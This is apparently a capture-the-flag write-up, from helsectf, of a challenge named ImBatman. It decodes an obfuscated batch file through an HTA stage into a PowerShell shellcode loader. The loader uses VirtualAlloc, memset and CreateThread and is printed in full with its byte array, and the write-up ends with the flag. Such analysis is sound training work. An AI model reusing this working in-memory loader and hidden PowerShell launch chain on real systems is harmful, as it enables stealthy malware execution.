# ImBatman

Batfiler brukes også for skadevarlevering. Selvsagt med litt obfuskering.
Lykke til

[⬇️ ImBatMan.bat](./ImBatMan.bat)

# Writeup

The script writes a base64 encoded string to `%tmp%/x` then decodes it into `%tmp%/x.hta` and executes that. Below is `x.hta` manually prettified:

```javascript
<script>
actObj=new ActiveXObject("WScript.Shell");
actObj.run('%windir%\\System32\\cmd.exe /c powershell -w 1 -C "<long command>"', 0);
window.close();
</script>
```

The "Long Command" above is moved here for better readability:

```shell
sv Ki -;
sv xP ec;
sv s ((gv Ki).value.toString()+(gv xP).value.toString());
powershell (gv s).value.toString() \'long base64 string\'
```

The three first one just makes a variable named "s" containing "-ec" which are arguments to `powershell` command below. `-ec` just mean that the command is encoded in base64.

The base64 string decodes to:

```csharp
$MPm = '$MP = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$gL = Add-Type -memberDefinition $MP -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$aN = 0xFC,0xE8,0x82,0x60,0x89,0xE5,0x31,0xC0,0x64,0x8B,0x50,0x30,0x8B,0x52,0x0C,0x8B,0x52,0x14,0x8B,0x72,0x28,0x0F,0xB7,0x4A,0x26,0x31,0xFF,0xAC,0x3C,0x61,0x7C,0x02,0x2C,0x20,0xC1,0xCF,0x0D,0x01,0xC7,0xE2,0xF2,0x52,0x57,0x8B,0x52,0x10,0x8B,0x4A,0x3C,0x8B,0x4C,0x11,0x78,0xE3,0x48,0x01,0xD1,0x51,0x8B,0x59,0x20,0x01,0xD3,0x8B,0x49,0x18,0xE3,0x3A,0x49,0x8B,0x34,0x8B,0x01,0xD6,0x31,0xFF,0xAC,0xC1,0xCF,0x0D,0x01,0xC7,0x38,0xE0,0x75,0xF6,0x03,0x7D,0xF8,0x3B,0x7D,0x24,0x75,0xE4,0x58,0x8B,0x58,0x24,0x01,0xD3,0x66,0x8B,0x0C,0x4B,0x8B,0x58,0x1C,0x01,0xD3,0x8B,0x04,0x8B,0x01,0xD0,0x89,0x44,0x24,0x24,0x5B,0x5B,0x61,0x59,0x5A,0x51,0xFF,0xE0,0x5F,0x5F,0x5A,0x8B,0x12,0xEB,0x8D,0x5D,0x6A,0x01,0x8D,0x85,0xB2,0x50,0x68,0x31,0x8B,0x6F,0x87,0xFF,0xD5,0xBB,0xF0,0xB5,0xA2,0x56,0x68,0xA6,0x95,0xBD,0x9D,0xFF,0xD5,0x3C,0x06,0x7C,0x0A,0x80,0xFB,0xE0,0x75,0x05,0xBB,0x47,0x13,0x72,0x6F,0x6A,0x53,0xFF,0xD5,0x77,0x72,0x69,0x74,0x65,0x2D,0x6F,0x75,0x74,0x70,0x75,0x74,0x20,0x22,0x68,0x65,0x6C,0x73,0x65,0x63,0x74,0x66,0x7B,0x49,0x6D,0x41,0x42,0x61,0x74,0x2D,0x4E,0x6F,0x2D,0x41,0x2D,0x76,0x62,0x73,0x2D,0x6E,0x6F,0x2D,0x73,0x68,0x65,0x6C,0x6C,0x63,0x6F,0x64,0x65,0x2D,0x74,0x6F,0x2D,0x70,0x6F,0x77,0x65,0x72,0x73,0x68,0x65,0x6C,0x6C,0x2D,0x6F,0x68,0x2D,0x77,0x65,0x6C,0x6C,0x7D,0x22;$Ud = 0x1000;if ($aN.Length -gt 0x1000){$Ud = $aN.Length};$mM=$gL::VirtualAlloc(0,0x1000,$Ud,0x40);for ($Bw=0;$Bw -le ($aN.Length-1);$Bw++) {$gL::memset([IntPtr]($mM.ToInt32()+$Bw), $aN[$Bw], 1)};$gL::CreateThread(0,0,$mM,0,0,0);for (;){Start-Sleep 60};';$cF = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($MPm));$pq = "-ec ";if([IntPtr]::Size -eq 8){$Jr = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $Jr $pq $cF"}else{;iex "& powershell $pq $cF";}
```

I now just extracted the bytes and converted them to a string to find the flag using [CyberChef](https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Regex','string':'0x'%7D,'',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':','%7D,'',true,false,true,false)From_Hex('Auto')From_Base64('A-Za-z0-9%2B/%3D',true,false/disabled)Strings('Single%20byte',4,'Alphanumeric%20%2B%20punctuation%20(A)',false,false,false/disabled)Remove_null_bytes(/disabled)&input=MHhGQywweEU4LDB4ODIsMHg2MCwweDg5LDB4RTUsMHgzMSwweEMwLDB4NjQsMHg4QiwweDUwLDB4MzAsMHg4QiwweDUyLDB4MEMsMHg4QiwweDUyLDB4MTQsMHg4QiwweDcyLDB4MjgsMHgwRiwweEI3LDB4NEEsMHgyNiwweDMxLDB4RkYsMHhBQywweDNDLDB4NjEsMHg3QywweDAyLDB4MkMsMHgyMCwweEMxLDB4Q0YsMHgwRCwweDAxLDB4QzcsMHhFMiwweEYyLDB4NTIsMHg1NywweDhCLDB4NTIsMHgxMCwweDhCLDB4NEEsMHgzQywweDhCLDB4NEMsMHgxMSwweDc4LDB4RTMsMHg0OCwweDAxLDB4RDEsMHg1MSwweDhCLDB4NTksMHgyMCwweDAxLDB4RDMsMHg4QiwweDQ5LDB4MTgsMHhFMywweDNBLDB4NDksMHg4QiwweDM0LDB4OEIsMHgwMSwweEQ2LDB4MzEsMHhGRiwweEFDLDB4QzEsMHhDRiwweDBELDB4MDEsMHhDNywweDM4LDB4RTAsMHg3NSwweEY2LDB4MDMsMHg3RCwweEY4LDB4M0IsMHg3RCwweDI0LDB4NzUsMHhFNCwweDU4LDB4OEIsMHg1OCwweDI0LDB4MDEsMHhEMywweDY2LDB4OEIsMHgwQywweDRCLDB4OEIsMHg1OCwweDFDLDB4MDEsMHhEMywweDhCLDB4MDQsMHg4QiwweDAxLDB4RDAsMHg4OSwweDQ0LDB4MjQsMHgyNCwweDVCLDB4NUIsMHg2MSwweDU5LDB4NUEsMHg1MSwweEZGLDB4RTAsMHg1RiwweDVGLDB4NUEsMHg4QiwweDEyLDB4RUIsMHg4RCwweDVELDB4NkEsMHgwMSwweDhELDB4ODUsMHhCMiwweDUwLDB4NjgsMHgzMSwweDhCLDB4NkYsMHg4NywweEZGLDB4RDUsMHhCQiwweEYwLDB4QjUsMHhBMiwweDU2LDB4NjgsMHhBNiwweDk1LDB4QkQsMHg5RCwweEZGLDB4RDUsMHgzQywweDA2LDB4N0MsMHgwQSwweDgwLDB4RkIsMHhFMCwweDc1LDB4MDUsMHhCQiwweDQ3LDB4MTMsMHg3MiwweDZGLDB4NkEsMHg1MywweEZGLDB4RDUsMHg3NywweDcyLDB4NjksMHg3NCwweDY1LDB4MkQsMHg2RiwweDc1LDB4NzQsMHg3MCwweDc1LDB4NzQsMHgyMCwweDIyLDB4NjgsMHg2NSwweDZDLDB4NzMsMHg2NSwweDYzLDB4NzQsMHg2NiwweDdCLDB4NDksMHg2RCwweDQxLDB4NDIsMHg2MSwweDc0LDB4MkQsMHg0RSwweDZGLDB4MkQsMHg0MSwweDJELDB4NzYsMHg2MiwweDczLDB4MkQsMHg2RSwweDZGLDB4MkQsMHg3MywweDY4LDB4NjUsMHg2QywweDZDLDB4NjMsMHg2RiwweDY0LDB4NjUsMHgyRCwweDc0LDB4NkYsMHgyRCwweDcwLDB4NkYsMHg3NywweDY1LDB4NzIsMHg3MywweDY4LDB4NjUsMHg2QywweDZDLDB4MkQsMHg2RiwweDY4LDB4MkQsMHg3NywweDY1LDB4NkMsMHg2QywweDdELDB4MjI&oeol=FF)

# Flag

```
helsectf{ImABat-No-A-vbs-no-shellcode-to-powershell-oh-well}
```
